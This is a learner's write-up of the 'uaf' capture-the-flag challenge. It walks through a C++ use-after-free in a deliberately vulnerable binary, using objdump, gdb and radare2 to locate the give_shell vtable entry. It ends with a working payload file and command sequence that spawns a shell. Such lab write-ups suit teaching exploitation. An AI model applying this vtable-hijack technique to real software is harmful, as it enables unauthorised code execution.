# uaf
Use after free essentially refers to the ability to access areas
of memory that have already been freed.

## Looking at the source code
There are three classes: human, man and woman. Man and woman seem
to be subclasses of the human class. What's interesting about the 
human class is that it has a private method that executes /bin/sh

In the main function, there are three options that the user can
invoke:
1) Use the classes (call their methods)
2) Allocate data
3) Free the classes

As the namesake of this challenge goes, you want to use classes (1)
after they are freed (3).

In C++, the reference of functions of classes are stored in a 
vftable (virtual function table)

Something worth noting that in this example, the object is 24 bytes

## Looking at disassembly
If we do an objdump of the uaf and look at the disassembled main
function. We can see that the "Man" class is created at 400f13

HOLYMOLY 
My life has changed. c++ assembly is mangled by default, you have
these weird symbols like <_ZN3MANC2ESsi> and they're so cryptic.

You can use
set print asm-demangle on

So that <_ZN3MANC2ESsi> can be known as <Man::Man(std::string, int)>

The solution that I found involved obtaining the Man object's vtable
from the stack. Unfortunately when I tried to find the value at
$rbp-0x38 right after the object was created, it kept referencing
an inaccessible memory location.

## New tools
readelf uaf -a | grep Man | c++filt 	# reads and elf file
checksec (file) 											# checks for stack canary

## Plan B
Using redare2 to analyse the disassembled binary outside of gdb.

> aaa 					# analyse all referenced code
> s sym.main 		# disassemble main(?)
> pdf 					# print disassembled functions (?)

0x400fb2 -> 0x400fc6: switch statements (1, 2, 3)
You can also see a CODE XREF from main (0x400fc6) which shows the
duplicate calls of the introduce() methods.

Upon pdf @method.Man.Man, this shows that the address of the give_
shell function is at 0x401570. We can verify this by using r2 av
to list vtables - which confirms:

0x00401570 : method.Human.give_shell

## Payload
So naturally we can call this address by writing it to a file which
gets opened as argv[2] when option 2 is selected. 

python -c 'print("\x70\x15\x40\x00\x00\x00\x00\x00")' > /tmp/atk
./uaf 24 /tmp/atk

The size of the data being allocate is 24 - because the size of each
object is 24 bytes. You will also need to select option 2 twice to
allocate 2x24 bytes representative of the 2 objects that were freed.

Select option 1 to supposedly pop the shell. But when the above is 
executed, it calls introductions??

Going back to the disassembled main function, specifically in the
use (1) switch case, the $rax register is increased by 8 before 
being called.

That means we need to subtract 8 from the 0x00401570 for the runtime
to execute the shell.

python -c 'print("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/atk
./uaf 24 /tmp/atk

> open shell
cat flag


